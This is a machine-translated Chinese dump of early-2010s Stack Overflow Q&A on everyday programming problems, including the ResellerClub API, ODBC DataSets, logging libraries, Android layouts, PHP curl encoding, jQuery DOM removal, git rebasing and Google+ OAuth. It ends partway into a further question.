> 时间：2012-10-02T16:28:12.887

[您可以在ResellerClub HTTP API 文档](http://manage.resellerclub.com/kb/answer/744)中找到大部分此类信息，但是，您需要执行以下操作才能开始工作。

URL 没有任何问题。那是他们的测试 URL。

[https://test.httpapi.com/api/domains/available.json?auth-userid=0&auth-password=password&domain-name=domain1&domain-name=domain2&tlds=com&tlds=net](https://test.httpapi.com/api/domains/available.json?auth-userid=0&auth-password=password&domain-name=domain1&domain-name=domain2&tlds=com&tlds=net)

...是用于检查域名可用性的 URL。您应该将 auth-userid 参数替换为您的 ResellerClub 用户 ID（您可以从经销商控制面板获取此信息），并将 auth-password 参数替换为您的密码。

如果您的用户 ID 是*123456*，密码是*albatross*，那么 URL 将如下所示：

```
https://test.httpapi.com/api/domains/available.json?auth-userid=123456&auth-password=albatross&domain-name=google&tlds=com&tlds=net 
```

此 URL 将在您的浏览器屏幕上输出 JSON。

此 URL 不起作用，因为您需要将您的 IP 地址添加到白名单 IP 地址列表中才能进行 API 调用。您可以在 ResellerClub 控制面板中找到此设置。转到**设置 -> API**并添加您的 IP 地址。在 30 分钟内，此 URL 将开始生成 JSON。

要在您的代码中使用它，您需要在控制面板中将服务器的 IP 列入白名单，并进行 CURL 调用或打开套接字连接等。

让我知道这篇文章是否有帮助。

# c# - 使用 DataSet 从 ODBC 读取数据

> ID：10246705
> 
> 赞同：0
> 
> 时间：2012-04-20T12:57:46.950
> 
> 标签：c#, dataset

我已经为数据库创建了 ODBS 用户 DNS，打开了 VS，创建了 DataSet 并导入了一张表`members`。我想从数据集中读取所有记录，该怎么做？我在下面尝试过查询，但它没有返回任何结果。我可以使用设计器中的预览菜单预览数据，但找不到使用代码获取数据的方法。

```
 var dataSet = new DataSet1();        
    var membersDataTable = dataSet.members;

    var take = membersDataTable.Take(100); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T13:07:06.513

看起来您已经为 DataSet 创建了架构，但尚未运行任何查询来[**加载**DataSet](http://msdn.microsoft.com/en-us/library/system.data.odbc.odbcdataadapter.aspx)。

```
using (OdbcConnection connection = 
               new OdbcConnection(connectionString))
    {
        string queryString = "SELECT * FROM Members";
        OdbcDataAdapter adapter = 
            new OdbcDataAdapter(queryString, connection);

        // Open the connection and fill the DataSet.
        try
        {
            connection.Open();
            adapter.Fill(dataSet);
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
        // The connection is automatically closed when the
        // code exits the using block. 
```

# python - Python - TypeError: __init__() 正好需要 2 个参数（给定 3 个），但我给了 2 个

> ID：10246707
> 
> 赞同：0
> 
> 时间：2012-04-20T12:58:00.033
> 
> 标签：python, python-2.7

我是 Python 新手，所以我尝试了几行代码：

```
class loesung02(object):
    html = ""
    file1 = ""
    def __init__(self, html, file1):
        self.html = html
        self.file1 = file1
        print html + file1 
```

我这样称呼它：

```
loesung02("aaaaaaaaaaaa", "bbbbbbbbbbb") 
```

使用 Python 外壳

但我总是收到错误消息，那么有什么问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T12:12:19.893

你得到什么错误信息？你的代码在我的电脑上运行得很好。我正在使用 python 2.7.1。你是把它写在一个文件中然后运行它还是你把它写在解释器中？如果是后者，请重新初始化或重新运行您的解释器，因为可能有其他变量会干扰您的代码。

# java - Logger.getLogger(className) 和 LogFactory.getLog(className) 的区别？

> ID：10246708
> 
> 赞同：18
> 
> 时间：2012-04-20T12:58:02.413
> 
> 标签：java, logging, log4j

我知道它的包装差异

1)`org.apache.log4j.Logger logger = Logger.getLogger(clazz);`

2)`org.apache.commons.logging.Log log = LogFactory.getLog(clazz);`

第一个使用记录器 via `log4j`，第二个使用`commons.logging`. 我们有一个巨大的项目，在某些类中记录器是使用配置的`log4j`，在某些情况下是它的`commons.logging`.

我确实找到了一个 log4j 属性文件。是否有类似的属性文件`commons.logging`？我在哪里配置公共日志记录？我无法看到由`commons-logging`.

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-20T13:07:55.803

是的，commons-logging 是一个外观 API，它被假定为将您从底层日志框架中抽象出来（实际上在[log4j](/questions/tagged/log4j "显示标记为“log4j”的问题")和`java.util.logging`类路径。

不幸的是，由于一些设计错误，它在复杂的类加载环境（如应用程序服务器）中存在问题。目前它已被[slf4j](/questions/tagged/slf4j "显示标记为“slf4j”的问题")有效取代。

在您的情况下，我建议坚持使用一个 API - Log4J 或 commons-logging，即使 commons-logging 将（很可能）委托给 log4J。您也可以迁移到使用 SLF4J 并安装桥接 API，但这稍微高级一些。

# oracle - 列数据作为列标题

> ID：10246713
> 
> 赞同：0
> 
> 时间：2012-04-20T12:58:34.283
> 
> 标签：oracle, oracle9i, plsqldeveloper

我面临一个非常讨厌的问题来创建报告。为此，我想将列数据作为列标题。

表： **技能表**

```
SKILL_ID    |      NAME
3431060     |      Stomach
3431064     |      Hand
3437806     |      Finger 
```

**localnode_table**（实际上具有技能表中名称的顺序/对齐方式（例如下一个和上一个）。

```
NODE_ID  |  PREVIOUS_ID  |  NEXT_ID
3431060  |               |  3431064
3431064  |    3431060    |  3437806
3437806  |    3431064 
```

如何使它看起来像：

```
Stomach |   Hand |   Finger
3431060 |  3431064 | 3437806 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:00:48.323

看看这个话题

[http://www.simple-talk.com/sql/t-sql-programming/creating-cross-tab-queries-and-pivot-tables-in-sql/](http://www.simple-talk.com/sql/t-sql-programming/creating-cross-tab-queries-and-pivot-tables-in-sql/)

和 Oracle 特定的

[https://forums.oracle.com/forums/thread.jspa?messageID=1036809](https://forums.oracle.com/forums/thread.jspa?messageID=1036809)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-02T11:02:19.460

This should work for your requirement,

```
SELECT
     ( SELECT SKILL_ID FROM skill_table WHERE  name = 'Stomach'),
     ( SELECT SKILL_ID FROM skill_table WHERE  name = 'Hand'),
     ( SELECT SKILL_ID FROM skill_table WHERE  name = 'Finger')
FROM dual       
    UNION ALL
SELECT
     ( SELECT NAME FROM skill_table WHERE  name  = 'Stomach'),
     ( SELECT NAME FROM skill_table WHERE  name  = 'Hand'),
     ( SELECT NAME FROM skill_table WHERE  name  = 'Finger')
FROM dual; 
```

# android - Android 覆盖在布局边界之外/之间

> ID：10246726
> 
> 赞同：7
> 
> 时间：2012-04-20T12:59:18.647
> 
> 标签：android, layout

我必须添加一个覆盖（ImageView），以便它稍微移动到包含布局的左边界的左侧。

![在此处输入图像描述](../Images/1a67d2253696692b80bbd13e511a21b5.png)

做这个的最好方式是什么？

尝试了一些简单的事情，比如将 ImageView 放在布局中并使用负边距

```
android:layout_marginLeft="-20dip" 
```

这使得：

![在此处输入图像描述](../Images/97f7ecc6d49287be30709d0436ffa845.png)

（更正：图片中的文字应该是 20dip 而不是 20px）

AbsoluteLayout 已弃用。有没有像z-order这样的东西？或者我该怎么办？

提前致谢。

编辑：我尝试使用相对布局。一样的效果。这是 xml 减少到最低限度：

```
<RelativeLayout  xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="wrap_content"
android:clipChildren="false"
android:paddingLeft="50dip"
>

<ImageView
    android:id="@+id/myId"
    android:layout_width="60dip"
    android:layout_height="60dip"
    android:layout_marginLeft="-30dip"
    android:clipChildren="false"
    android:src="@drawable/pic" />

</RelativeLayout> 
```

结果 ![在此处输入图像描述](../Images/b56d201200379d9ea19d4ced2cd8ec1d.png)

当包含布局的背景图像小于屏幕而不是填充时，也会发生这种情况。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-22T07:20:09.957

使用 RelativeLayout 而不是 LinearLayout （允许重叠）并将其添加到 RelativeLayout 修复它：

```
android:clipToPadding="false" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T06:38:12.187

在 xml 中设置“android:clipChildren = false”

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-12-31T11:14:24.553

代替

> 机器人：layout_marginLeft="-30dip"

尝试

> 安卓：paddingLeft="-30dp"

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-10-19T14:54:48.583

在宽度= 30dp的线性布局左侧使用透明（android：background =“#00000000”）图像视图。并在相对布局的情况下使 myId 左对齐。如果您使用线性布局，请将方向设为水平，并让透明图像视图成为其中的第一个条目。

# .net - 如何为 vb.net 应用程序创建 adobe air 扩展？

> ID：10246732
> 
> 赞同：0
> 
> 时间：2012-04-20T12:59:34.750
> 
> 标签：.net, air, adobe

我需要为我的 adobe air 应用程序创建一个扩展，该应用程序在单击舞台上的按钮时会显示一个 Windows 窗体。我找到了一种创建扩展的方法，但我发现的所有示例都要求我在 Visual C++ 中创建扩展。

有什么方法可以从我的 vb.net 应用程序创建扩展？

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T15:18:27.177

虽然我没有亲自做过任何事情，但您应该能够使用扩展上下文和本机进程。

创建一个 ExtensionContext 实例 [http://help.adobe.com/en_US/air/extensions/WSb464b1207c184b143961a5e412937b5d5c6-7ffe.html](http://help.adobe.com/en_US/air/extensions/WSb464b1207c184b143961a5e412937b5d5c6-7ffe.html)

与 AIR 中的本机进程通信 [http://help.adobe.com/en_US/as3/dev/WSb2ba3b1aad8a27b060d22f991220f00ad8a-8000.html](http://help.adobe.com/en_US/as3/dev/WSb2ba3b1aad8a27b060d22f991220f00ad8a-8000.html)

# php - PHP Curl中postFields中的空格

> ID：10246734
> 
> 赞同：0
> 
> 时间：2012-04-20T12:59:53.697
> 
> 标签：php, curl, libcurl

我有下一个代码：

```
$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'http://www.mydomain.com/test.php');
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS,"First Name=Jhon&Last Name=bt");
curl_exec ($c);
curl_close ($c); 
```

我的问题是这段代码中的空格：

```
"First Name=Jhon&Last Name=bt" 
```

我尝试了下一个代码：

$test=rawurlencode("First Name=Jhon&Last Name=bt");

```
$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'http://www.mydomain.com/test.php');
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS,$test);
curl_exec ($c);
curl_close ($c); 
```

我也试过

$first_name=rawurlencode("名字");

$last_name=rawurlencode("姓氏");

```
$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'http://www.mydomain.com/test.php');
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS,"$first_name=Jhon&$last_name=bt");
curl_exec ($c);
curl_close ($c); 
```

我的错误是什么？不管用。我需要使用变量“名字”和“姓氏”的名称发送。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:02:36.700

## 独立的 curl 编码。

[http://curl.haxx.se/docs/manpage.html#--data-urlencode](http://curl.haxx.se/docs/manpage.html#--data-urlencode)

## PHP urlencoding

只需先对值进行编码，然后将其作为 post 字段选项传递给 curl。

```
$encodedValue = urlEncode("this has spaces - oh no!");
$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'http://www.mydomain.com/test.php');
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS , "value=" . $encodedValue);
curl_exec ($c);
curl_close ($c); 
```

或者，如果您的*钥匙*有空格：

```
 $encodedKey = urlEncode("first name");
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, 'http://www.mydomain.com/test.php');
    curl_setopt($c, CURLOPT_POST, true);
    curl_setopt($c, CURLOPT_POSTFIELDS , $encodedKey . "=Bobby");
    curl_exec ($c);
    curl_close ($c) 
```

# java - 类型转换异常：Apache Camel 和 CXF

> ID：10246736
> 
> 赞同：0
> 
> 时间：2012-04-20T12:59:59.970
> 
> 标签：java, rest, cxf, apache-camel

我正在尝试将 CXF RESTful Web 服务与 Apache Camel 集成。当我向我的 Web 服务发送请求时出现以下异常：

```
Caused by: org.apache.camel.NoTypeConversionAvailableException: No type converter available to convert from type: org.apache.cxf.message.MessageContentsList to the required type: java.io.InputStream with value [null]
    at org.apache.camel.impl.converter.BaseTypeConverterRegistry.mandatoryConvertTo(BaseTypeConverterRegistry.java:147)
    at org.apache.camel.impl.MessageSupport.getMandatoryBody(MessageSupport.java:100)
    ... 68 more 
```

我正在粘贴我的配置 xml 的一部分以供审查：

```
<jaxrs:server id="restContainer" address="/" staticSubresourceResolution="true">

<jaxrs:serviceBeans>
    <ref bean="FooBar"/>
</jaxrs:serviceBeans>

<jaxrs:providers>
    <bean class="org.apache.cxf.jaxrs.provider.JSONProvider">
    <property name="dropRootElement" value="true"/>
    <property name="supportUnwrapped" value="true"/>
</jaxrs:providers>

<camelcxf:rsServer id="rsServer" address="http://localhost:port/MyApplication/rest/foobar" serviceClass="com.camel.example.FooBar"/>

<camel:camelContext id="camelContext-1">
    <camel:route>
        <camel:from uri="cxfrs:bean:rsServer"/>
        <camel:to uri="http://www.google.com"/>
    </camel:route>
</camel:camelContext> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-23T13:39:28.707

解决了所有错误..实际上问题不在于我的 cxf 服务器被击中时，而是当交换处于“to”部分时......我必须在 from 和 to 之间添加一个处理器并覆盖所有的 CamelHttpUri ， CamelHttpMethod 等 .... 使其工作。

```
<camelcxf:rsServer id="rsServer" address="http://localhost:port/MyApplication/rest/foobar serviceClass="com.camel.example.FooBar" />  <camel:camelContext id="camelContext-1">  <camel:route>  
<camel:from uri="cxfrs:bean:rsServer" />  
<camel:process ref="customInProcessor" />
<camel:to uri="http://www.google.com" /> 
 </camel:route>
  </camel:camelContext> 

<bean id="customInProcessor" class="com.camel.MyInProcessor" /> 
```

# jquery - 使用 jquery 和重复的 div 将 div 更新 $.post 到 $.get 时出错

> ID：10246742
> 
> 赞同：1
> 
> 时间：2012-04-20T13:00:25.030
> 
> 标签：jquery, ajax, post, html, get

我编写了这段代码，以便在查看 #story-comments-text 时显示另一个 div (#comments-popup)，该 div 调用其 html 代码的 $.get 请求。

这部分效果很好。

当我调用 $.post 请求时，我遇到了问题。

#comments-popup 由调用 $.post() 的提交按钮更新。该请求效果很好，但是在 div 更新之后，当我将鼠标移到它上面时，它会显示很多 #comments-popup 底部的第一个。问题出在哪里？我该如何解决？我仍然是ajax的菜鸟。对不起我的英语不好的家伙！

```
 $("#story-comments-text").mouseenter(function()
{
    var popupdiv="<div id='comments-popup'></div>";
    var href = jQuery(location).attr('href');
    var newHref=href+"&comment=1";
    if($("comments-popup").is(":visible"))
    {
        $("comments-popup").remove();
    }
    $.get
    (   newHref,
        function(data)
        {
            $("#story-comments-text").append(popupdiv);
            $("#comments-popup").css("display", "none");
            $("#comments-popup").html(data);
            $("#comments-popup").fadeIn();
            $("#story-comment-submit").click(function(e)
            {
                e.preventDefault();
                var href = jQuery(location).attr('href');
                var newHref=href+"&comment=1&addcomment=1";
                var comment=$("#story-comment-form #story-comment-form-text").val();
                $.post
                (
                    newHref,
                    {
                        "comment":comment
                    },
                    function(data)
                    {
                        if(data)
                        {
                            $("#comments-popup").remove();

                            $("#comments-popup").css("display", "none");
                            $("#comments-popup").html(data);
                            $("#comments-popup").fadeIn();
                        }

                    }
                );
            });
        }
    ); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:08:48.597

改变

```
if($("comments-popup").is(":visible"))
{
    $("comments-popup").remove();
} 
```

至

```
if($("#comments-popup").is(":visible"))
    {
        $("#comments-popup").remove();
    } 
```

只是猜测，可能还有更多错误。

# git - 如何将新的 git 存储库更改为来自另一个存储库的分支？

> ID：10246747
> 
> 赞同：3
> 
> 时间：2012-04-20T13:00:38.503
> 
> 标签：git, repository, parent, rebase

我下载了一个 3rd 方项目作为非跟踪文件（没有 .git 文件夹）并在其中启动了一个新的 git 存储库`$git init`，以跟踪我的更改。

后来我发现这个项目已经有一个公共的 git 存储库，它与我下载的裸文件具有相同的状态（与我最初的提交相同）。

*我**应该**做的：*

克隆远程仓库并创建一个新的本地分支，然后将其推送到远程。

*我**实际上**做了什么：*

只是拿了文件并在其中启动了一个干净的本地 git repo (master) 并进行了几次提交。

*我想做的事：*

将我的本地初始提交变成远程仓库的一个分支（更改其父级）并保留我已经完成的更改。

我想这应该是可能的，但我不太了解 Git。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:05:19.263

好吧，您可以尝试以下方法（您可能希望使用与 不同的名称`origin`，取决于您）：

1.  `git remote add origin url_of_project_repository`
2.  `git fetch origin`
3.  `git rebase FETCH_HEAD`

您有很大的机会 git 实际上会计算出您的基础，而新远程实际上是同一组文件，并且会通过跳过除您的更改之外的任何内容来解决虚假的合并冲突。

如果这不能正常工作，您也可以在其他地方克隆“真实”存储库，然后在其上重新应用您的更改（并且有无数种方法可以做到这一点，从非常手动的 DIY 方式到一些更自动化的手段）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T13:05:21.890

您可以将您的仓库作为远程仓库添加到原始仓库，获取提交，然后尝试重新设置基准。

# c# - SharePoint 的图像缩略图预览

> ID：10246748
> 
> 赞同：-1
> 
> 时间：2012-04-20T13:00:40.547
> 
> 标签：c#, jquery, css, sharepoint-2010, sharepointdocumentlibrary

有没有办法生成添加到 SharePoint 列表中的图像的图像预览？

场景如下：

对于添加到 SharePoint 文档库中的图像文件（.jpg、.tif、.png），当用户将鼠标悬停在任何图像文件上时，会通过“列表视图 Web 部件在另一个页面上”列出或查看这些文件，弹出窗口或任何类似的东西应该显示图像的预览。这是否可以在 SharePoint 中实现以及如何实现。

css 会单独实现这一点，还是需要后面的 c# 代码。

非常感谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T14:01:04.967

为什么不使用 SharePoint 图片库？那里有缩略图、预览等。

或者您可以使用 ex 制作自定义解决方案。jQuery 花式框。

我建议您使用标准 SharePoint 或在您自己的列表中连接图片库上的悬停效果。

请参阅 [http://office.microsoft.com/en-us/windows-sharepoint-services-help/working-with-sharepoint-picture-libraries-HA001123335.aspx](http://office.microsoft.com/en-us/windows-sharepoint-services-help/working-with-sharepoint-picture-libraries-HA001123335.aspx)

[http://www.youtube.com/watch?v=olaGyX4g2Cc](http://www.youtube.com/watch?v=olaGyX4g2Cc)

# java - 如何使用 Guava 的 ClassToInstanceMap ？

> ID：10246757
> 
> 赞同：1
> 
> 时间：2012-04-20T13:01:14.827
> 
> 标签：java, guava

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T18:43:36.873

由于您确定这`o`是 的一个实例`MyObject`，因此您实际上并不需要使用类型安全的`putInstance`方法。你可以只使用标准`put()`：

```
private final ClassToInstanceMap<MyObject> instances = MutableClassToInstanceMap.create();

public void addMyObject(MyObject o) {
    instances.put(o.getClass(), o);
} 
```

`ClassToInstanceMap`无论如何都会对实例的类型进行运行时检查。

也就是说，我对使用类型安全方法执行此操作的方法很感兴趣。也许是一些 Java 泛型魔法 :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-23T09:06:39.263

只是为了记录，您可以使用缩小 Class 类型

```
o.getClass().asSubclass(MyObject.class) 
```

# android - 如何在 Android 应用上使用 Google+ 帐户提供多用户访问权限

> ID：10246759
> 
> 赞同：2
> 
> 时间：2012-04-20T11:31:14.820
> 
> 标签：android, google-plus, multiple-accounts

我正在开发一种多用户 Android 应用程序，该应用程序向其用户提供对 GMaps 的访问（互相查找）、聊天等。用户应该使用他们在 Twitter、Facebook、Google+ 等上的帐户登录到应用程序。除 G+ 之外的所有帐户都可以正常工作 - 应用程序只能使用其所有者帐户访问 G+ API。对于其他帐户，我收到 com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found 或“授权错误”。App在API Console上注册，使用OAuth2.0认证。我使用来自 Google 网站的标准身份验证机制。是否可以使用不同的 G+ 帐户登录？这是我的代码（Android v1.6）：

```
public class GooglePlusActivity extends Activity {

public static final String LOG_TAG = GooglePlusActivity.class.getSimpleName();
public static final String EXTRA_FIRSTNAME = "firstname";
public static final String EXTRA_LASTNAME = "lastname";
public static final String EXTRA_NICKNAME = "nickname";
public static final String EXTRA_SEX = "sex";
public static final String EXTRA_AVATAR = "avatar";
public static final String EXTRA_ID_SOCNET = "id_socnet";

private ApplicationSettings mSettings;
private Person mProfile;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    mSettings = ((TomskApplication)getApplication()).getSettings();
    signIn();
}

private void signIn() {
    WebView webView = new WebView(this);
    setContentView(webView);
    webView.getSettings().setJavaScriptEnabled(false);
    String googleAuthorizationRequestUrl = new GoogleAuthorizationRequestUrl(
            mSettings.getGPID(), mSettings.getGPRedirectURI(),
            mSettings.getGPScope()).build();
    webView.setWebViewClient(new WebViewClient() {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url){
            if (url.startsWith(mSettings.getGPRedirectURI())) {
                try {
                    Intent res_intent = new Intent();
                    if (url.indexOf("code=") != -1) {
                        String code = url.substring(mSettings
                                .getGPRedirectURI().length() + 7, url
                                .length());

                        AccessTokenResponse token = new GoogleAuthorizationCodeGrant(
                                new NetHttpTransport(),
                                new JacksonFactory(), mSettings.getGPID(),
                                mSettings.getGPSecret(), code, mSettings
                                        .getGPRedirectURI()).execute();

                        mSettings.setGPToken(token);

                        // Loading user data
                        retrieveProfile();
                        if (mProfile == null) {retrieveProfile();}
                        res_intent.putExtra(EXTRA_FIRSTNAME, mProfile
                                .getName().getGivenName());
                        res_intent.putExtra(EXTRA_LASTNAME, mProfile
                                .getName().getFamilyName());
                        res_intent.putExtra(EXTRA_NICKNAME,
                                mProfile.getNickname());
                        res_intent.putExtra(EXTRA_SEX, mProfile.getGender());
                        res_intent.putExtra(EXTRA_AVATAR, mProfile
                                .getImage().getUrl());
                        res_intent.putExtra(EXTRA_ID_SOCNET, mProfile.getId());
                        setResult(Activity.RESULT_OK, res_intent);
                        view.setVisibility(View.INVISIBLE);
                        finish();
                    } else if (url.indexOf("error=") != -1) {
                        view.setVisibility(View.INVISIBLE);
                        setResult(Activity.RESULT_CANCELED);
                        finish();
                    }

                } catch (IOException e) {
                    Log.d(LOG_TAG, e.toString());
                }
                return true;
            } else {
                return false;
            }
        }

    });
    webView.loadUrl(googleAuthorizationRequestUrl);
}

/**
 * Retrieve user profile
 */
private void retrieveProfile() throws IOException {
    JsonFactory jsonFactory = new JacksonFactory();
    HttpTransport transport = new NetHttpTransport();

    AccessTokenResponse token = mSettings.getGPToken();

    GoogleAccessProtectedResource accessProtectedResource = new GoogleAccessProtectedResource(
            token.accessToken, transport, jsonFactory,
            mSettings.getGPID(), mSettings.getGPSecret(),
            token.refreshToken);

    Builder b = Plus.builder(transport, jsonFactory)
            .setApplicationName("MyApp/1.0");
    b.setHttpRequestInitializer(accessProtectedResource);
    Plus plus = b.build();
    mProfile = plus.people().get("me").execute();
} 
```

}

我在 Google 网站 Stack Overflow 上搜索过，但一无所获。请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T14:27:36.877

不知道这会有所帮助，但是，如果你绝望....

2012 年 4 月 4 日一些 Android 客户端库的新版本在[这里](http://code.google.com/p/google-api-java-client/)

并且有新的 Google+ 示例，在 main() 方法中使用了一些重新配置的类，它们可以访问受保护的资源。R 1.8 中的新版本与您的代码不同，至少在堆栈的顶部.... IMO 在 Credential 类和 PLUS.Builder 的新示例中的使用可能归结为几乎您已经拥有的相同实现。如果您无法进行其他任何工作，您可能需要查看较新的示例。

**1.8 中来自 googlePlus 示例的新代码**

```
 public static void main(String[] args) {
    try {
      try {
        // authorization
        Credential credential = OAuth2Native.authorize(
            HTTP_TRANSPORT, JSON_FACTORY, new LocalServerReceiver(),
            Arrays.asList(PlusScopes.PLUS_ME));
        // set up global Plus instance
        plus = Plus.builder(HTTP_TRANSPORT, JSON_FACTORY)
            .setApplicationName("Google-PlusSample/1.0").setHttpRequestInitializer(credential)
            .build(); 
```

旧代码[在这里](http://goo.gl/f3jGF)

# javascript - c.replace 不是函数

> ID：10246761
> 
> 赞同：0
> 
> 时间：2012-04-20T13:01:22.083
> 
> 标签：javascript, jquery, dom

**大家好**，

实际上，当我试图删除一些 DOM 元素时，我得到了“c.replace 不是一个函数”，而且……我不明白。

我想删除一些

*   来自 DOM 的标签等，我做到了：

    ```
    var liste=document.getElementById("tabs").getElementsByTagName("li");

        for(i=0;i<liste.length;i++)
        {
            if(liste[i].id==2)
            {
                $("#tabs").detach(liste[i]);
            }
        } 
    ```

    我试过 .detach 和 .remove 但它是一样的。我的 jQuery 版本是 1.7.1.min.js。

    感谢帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T13:06:16.853

***NodeLIst 上的迭代顺序***

在删除元素时对正在修改的 NodeList 进行前向迭代可能是一个问题。从 DOM 中删除元素时反向迭代。

* * *

***滥用`detach()`***

此外，`.detach()`不执行嵌套查找的参数，而是充当 jQuery 对象中现有元素的过滤器，并且应该传递一个字符串。看来您实际上想要分离`li`，这意味着您需要调用`.detach()`自身`li`...

```
var liste=document.getElementById("tabs").getElementsByTagName("li");

var i = liste.length

while(i--) {
    if(liste[i].id==2) {
        $(liste[i]).detach();
    }
} 
```

* * *

***`remove()`可能是首选***

请记住，如果您使用`.detach()`，将保留任何 jQuery 数据。如果您不再使用该元素，则应该使用该元素`.remove()`。

```
// ...
    $(liste[i]).remove(); // clean up all data 
```

* * *

***代码缩减***

最后，由于您使用的是 jQuery，您可以在选择器中执行所有这些操作...

```
$('#tabs li[id=2]').remove(); // or .detach() if needed 
```

* * *

***有效的 id 属性***

关于 ID，请记住这些项目...

*   页面上的 ID 重复是无效的
*   在 HTML4 中，ID 以数字开头是无效的

在上面的选择器中，我使用了*attribute-equals*过滤器，所以它会起作用，但你应该使用有效的HTML 以避免其他地方出现问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T13:03:32.093

`liste`不是（还）一个 jQuery 对象。采用`$(liste[i])`

或使用

```
var liste= $('#tabs li'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T13:11:29.037

也许我遗漏了一些东西，但 id 是否应该与数字 2 匹配。

```
var liste=document.getElementById("tabs").getElementsByTagName("li");

for(i=0;i<liste.length;i++) {
    if(liste[i].id==2) {
       $(liste[i]).detach();
    }
} 
```

既然您已经在使用 jQuery，为什么不这样做：

```
$("li", "#tabs").filter("#2").detach(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T13:13:06.227

```
var two = document.getElementById('2');
two.parentNode.removeChild(two); 
```

# android - android:scheme 在我的设备上不起作用

> ID：10246763
> 
> 赞同：4
> 
> 时间：2012-04-20T13:01:28.957
> 
> 标签：android, url-scheme

我有一个自定义链接：callnumber://12345

我想通过以下方式捕获此链接的点击事件：

```
<activity android:name=".Test"
                  android:label="@string/app_name">
    <intent-filter>
    <data android:scheme="callnumber"/>
        <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    </intent-filter>
</activity> 
```

我已经在许多设备上进行了测试，例如：三星 Galaxy S2、三星 Galaxy 2、摩托罗拉 XT720，它运行良好，但在 HTC Sensation Z710e 上却无法运行。

我发现在 HTC Sensation Z710e 上，那个链接变成了[http://www.callnumber.com//](http://www.callnumber.com//)并用浏览器打开它。

我像这样转动了我的意图过滤器，它起作用了：

```
<intent-filter>
    <data android:scheme="http" android:host="www.callnumber.com"/>
        <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
</intent-filter> 
```

但是我不想捕获http方案，因为当它从自定义更改为http方案时很容易丢失数据。

示例：如果我的链接是 callnumber://12345# ，它将变成 http://www.callnumber.com//12345 ，它失去了我的字符 '#'

或者如果我的链接是 callnumber://12345#34567 ，它将变成[http://www.callnumber.com//12345](http://www.callnumber.com//12345)，它失去了我的 '#34567'

使用上面的 android 设备列表（HTC Sensation Z710e 除外），它会返回我想要的数据。

那么如何为所有 android 设备或至少为 HTC Sensation Z710e 捕获自定义方案？

非常感谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-03-12T15:00:23.807

添加数据行如下：

```
<data android:host="*" android:scheme="callnumber" /> 
```

# java - 从具有特定结构的文件生成自定义文本行

> ID：10246764
> 
> 赞同：0
> 
> 时间：2012-04-20T13:01:29.280
> 
> 标签：java, javascript, php, text

我有 1 个包含 Ips 的文本文件。就像这个 iptextfile.txt

```
10.0.0.1
192.168.1.1
123.123.123.123 
```

我想选择 iptextfile 并将其导出到另一个名为 export.txt 的文件，如下所示：

导出.txt

```
Ip Number 10.0.0.1 Num 10.0.0.1  
Ip Number 192.168.1.1 Num 192.168.1.1
Ip Number 123.123.123.123 Num 123.123.123.123 
```

你能推荐任何我可以做到这一点的软件或一些代码 PHP、Java 或 JavaScript。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:06:56.067

未经测试：

```
<?php
    $lines = file('ipaddresses.txt');
    $newtext = '';
    foreach ($lines as $line) 
    {
        $newtext.= "Ip Number {$line} Num {$line}}\n";
    }
    $handle = fopen('export.txt', 'w');
    fwrite($handle, $newtext);
    fclose($handle);
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:10:23.483

```
<?php

$in = fopen('iptextfile.txt','r');
$out = fopen('export.txt','w');
while($ip = trim(fgets($in))) {
    if(empty($ip)) continue;
    fputs($out, 'Ip Number '.$ip.' Num '.$ip."\n");
}
fclose($in);
fclose($out);

?> 
```

# java - 在 JUnit 中分组测试并指定在 Maven 中运行哪个

> ID：10246768
> 
